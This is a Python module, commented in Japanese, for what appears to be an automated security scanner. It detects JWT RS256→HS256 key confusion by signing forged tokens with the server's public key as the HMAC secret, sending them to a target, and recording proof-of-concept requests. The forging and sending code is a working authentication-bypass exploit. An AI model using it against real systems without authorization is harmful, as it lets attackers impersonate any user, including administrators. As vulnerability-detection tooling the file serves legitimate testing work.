"""
Smart JWT Forgery Hunter - RS256→HS256 キー混同 検出スペシャリスト (SGK-2026-0490)

サーバが RS256 で署名した JWT を検証する際、アルゴリズムを固定していないと、攻撃者は
**サーバの RSA 公開鍵を HMAC 秘密鍵として HS256 署名**した偽造トークンを作れる（公開鍵は
誰でも入手できるため、これは完全な認証バイパス＝任意の identity/role を偽造できる）。

確定は alg=none（[[jwt_alg_none]]）と同型の意味論（unauth ベースライン差分＋forged_identity
反映）に加え、**3者差分**でキー混同を厳密に証明する：
  - 公開鍵を HMAC 秘密に HS256 署名した偽造トークン → 受理（forged_identity 反映）
  - 誤った秘密で HS256 署名したトークン → 拒否（非反映。＝サーバは署名を検証している）
  - トークン無し → 空（＝盗んだセッションの再生ではない）
①受理×②拒否×③空 の差分が「公開鍵を HMAC 秘密として検証している本物のキー混同」を示す。

確定マーカーは alg=none と共有（`jwt_forgery_accepted`）＝偽造手法が違うだけで確定意味論は同じ。
封印再現（`_check_jwt_forgery_replay`）も forged_token 再送で手法非依存に流用される。
正規トークン（ユーザーの秘密）は payload 導出にのみ使い finding には一切含めない。
"""
import base64
import hashlib
import hmac
import json
import logging
import uuid
from typing import Any, Dict, List, Optional, Tuple

from src.core.agents.swarm.base import Specialist, Task
from src.core.models.finding import Finding, VulnType, Severity, Evidence

logger = logging.getLogger(__name__)

_JWT_SNIPPET_CAP = 1200
# 差し替える識別子クレームの既定候補（dot-path・payload に実在するものだけ使う）。
_IDENTITY_CLAIMS: Tuple[str, ...] = (
    "data.email", "data.username", "data.name", "data.user",
    "email", "username", "name", "sub", "user.email", "user_name",
)


def _b64u(raw: bytes) -> bytes:
    return base64.urlsafe_b64encode(raw).rstrip(b"=")


def _b64u_decode(seg: str) -> bytes:
    return base64.urlsafe_b64decode(seg + "=" * (-len(seg) % 4))


def _decode_jwt_payload(token: str) -> Optional[Dict[str, Any]]:
    try:
        parts = token.split(".")
        if len(parts) < 2:
            return None
        return json.loads(_b64u_decode(parts[1]))
    except (ValueError, TypeError, json.JSONDecodeError):
        return None


def _hs256(secret: bytes, payload: Dict[str, Any]) -> str:
    """HS256 でトークンを手動署名（PyJWT 2.x は公開鍵を HMAC 秘密に使う攻撃を
    防ぐため、意図的に低レベル HMAC で署名する）。"""
    header = _b64u(json.dumps({"alg": "HS256", "typ": "JWT"}, separators=(",", ":")).encode())
    body = _b64u(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = header + b"." + body
    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()
    return (signing_input + b"." + _b64u(sig)).decode()


def _set_claim(payload: Dict[str, Any], dot_path: str, value: str) -> Optional[Dict[str, Any]]:
    """payload をディープコピーし dot_path のクレームを value に差し替えて返す。
    そのクレームが実在しない場合は None（存在するクレームだけを偽造対象にする）。"""
    clone = json.loads(json.dumps(payload))
    parts = dot_path.split(".")
    cur: Any = clone
    for p in parts[:-1]:
        if not isinstance(cur, dict) or not isinstance(cur.get(p), dict):
            return None
        cur = cur[p]
    if not isinstance(cur, dict) or parts[-1] not in cur:
        return None
    cur[parts[-1]] = value
    return clone


def _snip(text: str) -> str:
    return (text or "")[:_JWT_SNIPPET_CAP]


class SmartJWTForgeryHunter(Specialist):
    name = "SmartJWTForgeryHunter"
    description = "JWT RS256->HS256 key confusion detector (3-way differential)"
    timeout_seconds = 120
    is_aggressive = False

    def __init__(self, config: Dict = None):
        super().__init__()
        self.config = config or {}

    async def execute(self, task: Task, quick_mode: bool = False) -> List[Finding]:
        result = await self._probe(task)
        if result is None:
            return []
        return [self._build_finding(task.target, result)]

    def _params(self, task: Task) -> Dict[str, Any]:
        return task.params if isinstance(getattr(task, "params", None), dict) else {}

    def _legit_token(self, task: Task) -> str:
        params = self._params(task)
        tok = str(params.get("jwt_token") or "").strip()
        if tok:
            return tok
        _auth = params.get("_auth", {}) if isinstance(params.get("_auth"), dict) else {}
        auth = str((_auth.get("auth_headers", {}) or {}).get("Authorization") or "").strip()
        if auth.lower().startswith("bearer "):
            return auth[7:].strip()
        return ""

    async def _public_key(self, task: Task) -> str:
        params = self._params(task)
        pem = str(params.get("jwt_public_key") or "").strip()
        if pem:
            return pem
        url = str(params.get("jwt_pubkey_url") or "").strip()
        if not url:
            return ""
        try:
            _status, body = await self._send(url, {})
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] pubkey fetch failed: %s", self.name, exc)
            return ""
        return body.strip()

    def _observe(self, task: Task) -> Optional[Dict[str, str]]:
        params = self._params(task)
        obs = params.get("jwt_observe")
        if isinstance(obs, dict) and str(obs.get("url") or "").strip():
            return {"method": str(obs.get("method") or "GET").upper(),
                    "url": str(obs.get("url"))}
        return None

    def _claims(self, task: Task) -> Tuple[str, ...]:
        params = self._params(task)
        provided = params.get("jwt_identity_claims")
        if isinstance(provided, (list, tuple)) and provided:
            return tuple(str(c) for c in provided)
        return _IDENTITY_CLAIMS

    async def _probe(self, task: Task) -> Optional[Dict[str, Any]]:
        observe = self._observe(task)
        if observe is None:
            return None
        legit = self._legit_token(task)
        if not legit:
            return None
        payload = _decode_jwt_payload(legit)
        if not isinstance(payload, dict):
            return None
        pubkey = await self._public_key(task)
        if not pubkey:
            return None
        obs_url = observe["url"]

        # ③ トークン無しのベースライン（identity 反映が無いこと）。
        try:
            _cs, control_body = await self._send(obs_url, {})
        except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
            logger.debug("[%s] control send failed: %s", self.name, exc)
            return None

        pubkey_bytes = pubkey.encode("utf-8")
        wrong_secret = ("shigoku_wrong_" + uuid.uuid4().hex).encode("utf-8")

        for claim in self._claims(task):
            marker = "shigoku_jwtforge_" + uuid.uuid4().hex[:12]
            forged_payload = _set_claim(payload, claim, marker)
            if forged_payload is None:
                continue
            forged_token = _hs256(pubkey_bytes, forged_payload)
            try:
                f_status, f_body = await self._send(obs_url, self._auth_headers(forged_token))
            except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
                logger.debug("[%s] forged send failed (%s): %s", self.name, claim, exc)
                continue
            if not (200 <= f_status < 300) or marker not in f_body:
                continue
            # ② 誤った秘密で署名 → 拒否されるはず（署名を検証している＝キー混同の証拠）。
            wrong_token = _hs256(wrong_secret, forged_payload)
            try:
                _ws, w_body = await self._send(obs_url, self._auth_headers(wrong_token))
            except Exception as exc:  # noqa: BLE001 — network boundary, fail closed
                logger.debug("[%s] wrong-secret send failed: %s", self.name, exc)
                continue
            if marker in w_body:
                # 誤り秘密でも反映＝署名を検証していない（キー混同でなく署名未検証）→ 本エンジンでは非確定
                continue
            if marker in control_body:
                continue  # トークン無しでも反映＝差分にならない
            return {
                "observe_url": obs_url,
                "claim": claim,
                "marker": marker,
                "forged_token": forged_token,
                "forged_status": f_status,
                "forged_served_body": _snip(f_body),
                "control_served_body": _snip(control_body),
                "wrong_secret_served_body": _snip(w_body),
            }
        return None

    @staticmethod
    def _auth_headers(token: str) -> Dict[str, str]:
        return {"Authorization": f"Bearer {token}", "Cookie": f"token={token}"}

    async def _send(self, url: str, headers: Dict[str, str]) -> Tuple[int, str]:
        """GET 送信（``self._client`` 注入 seam or AsyncNetworkClient）。"""
        async def _do(client):
            return await client.request("GET", url, headers=dict(headers or {}), use_proxy=True)

        injected = getattr(self, "_client", None)
        if injected is not None:
            resp = await _do(injected)
        else:
            from src.core.infra.network_client import AsyncNetworkClient
            async with AsyncNetworkClient() as client:
                resp = await _do(client)
        status = int(getattr(resp, "status", 0) or 0)
        rbody = getattr(resp, "body", None)
        if rbody is None:
            rbody = getattr(resp, "text", "") or ""
        if isinstance(rbody, bytes):
            rbody = rbody.decode("utf-8", errors="replace")
        return status, str(rbody)

    def _build_finding(self, target_url: str, proof: Dict[str, Any]) -> Finding:
        url = proof["observe_url"]
        claim = proof["claim"]
        marker = proof["marker"]
        forged_token = proof["forged_token"]
        f_status = proof["forged_status"]
        f_body = proof["forged_served_body"]
        control_body = proof["control_served_body"]
        wrong_body = proof["wrong_secret_served_body"]

        poc_request = (
            "# Step 1 — no token (baseline: identity absent)\r\n"
            f"GET {url} HTTP/1.1\r\n"
            "\r\n"
            "# Step 2 — forged HS256 token signed with the server's RSA PUBLIC KEY as HMAC secret\r\n"
            f"GET {url} HTTP/1.1\r\n"
            f"Authorization: Bearer {forged_token}\r\n"
            "\r\n"
            "# Step 3 — forged HS256 token signed with a WRONG secret (must be rejected)\r\n"
            f"GET {url} HTTP/1.1\r\n"
            "Authorization: Bearer <HS256 signed with wrong secret>\r\n"
        )
        poc_response = (
            f"# Step 1 response — identity absent (no token)\r\n"
            f"{control_body}\r\n"
            "\r\n"
            f"# Step 2 response — forged identity '{marker}' REFLECTED (HTTP {f_status}) = accepted\r\n"
            f"{f_body}\r\n"
            "\r\n"
            f"# Step 3 response — wrong-secret token REJECTED (identity '{marker}' absent)\r\n"
            f"{wrong_body}"
        )
        impact = (
            "サーバの RSA 公開鍵（誰でも入手可能）を HMAC 秘密鍵として HS256 署名した偽造 JWT が受理された"
            f"（クレーム '{claim}' に仕込んだ一意 identity '{marker}' が応答に反映・HTTP {f_status}）。"
            "誤った秘密で署名したトークンは拒否され（サーバは署名を検証している）、トークン無しでは identity が"
            "出ない。この3者差分は RS256→HS256 キー混同の決定的証拠であり、攻撃者は任意の identity/role"
            "（管理者を含む）を偽造できる＝完全な認証バイパスに直結する。"
        )
        return Finding(
            target_url=target_url,
            vuln_type=VulnType.JWT_RS256_HS256,
            severity=Severity.CRITICAL,
            title="JWT RS256->HS256 key confusion (forged token accepted)",
            description=(
                "RS256->HS256 key confusion confirmed by 3-way differential: an HS256 token signed "
                "with the server's RSA public key as the HMAC secret is accepted (forged identity "
                f"'{marker}' reflected, HTTP {f_status}), while a wrong-secret token is rejected and "
                "no token yields no identity."
            ),
            source_agent=self.name,
            confidence=0.97,
            impact=impact,
            reproduction_steps=[
                f"サーバの RS256 公開鍵を取得し、正規トークンの payload のクレーム '{claim}' を任意値に"
                "差し替え、公開鍵 PEM を HMAC 秘密鍵として HS256 署名する。",
                f"その偽造トークンを {url} に送ると受理され、偽造した identity が応答に反映される"
                f"（HTTP {f_status}）ことを確認する。",
                "誤った秘密で署名したトークンは拒否され、トークン無しでは identity が出ないことを確認する"
                "（3者差分＝キー混同の証明）。",
            ],
            tags=["jwt", "jwt_rs256_hs256", "critical", "jwt_forgery_accepted"],
            evidence=Evidence(
                request_method="GET",
                request_url=url,
                request_headers={"Authorization": f"Bearer {forged_token}"},
                request_body="",
                response_status=f_status,
                response_headers={},
                response_body=f_body,
            ),
            additional_info={
                # 確定バー（jwt_forgery_accepted）が参照する共有フィールド。
                "jwt_alg": "hs256",
                "jwt_key_confusion": True,
                "unauth_baseline_absent": True,
                "forged_identity": marker,
                "forged_identity_reflected": True,
                # 封印再現（_check_jwt_forgery_replay）が forged_token を再送する。
                "forged_token": forged_token,
                "jwt_forgery_evidence": {
                    "observe_url": url,
                    "claim": claim,
                    "forged_status": f_status,
                    "forged_served_body": f_body,
                    "control_served_body": control_body,
                    "wrong_secret_served_body": wrong_body,
                },
                "poc_request": poc_request,
                "poc_response": poc_response,
            },
        )
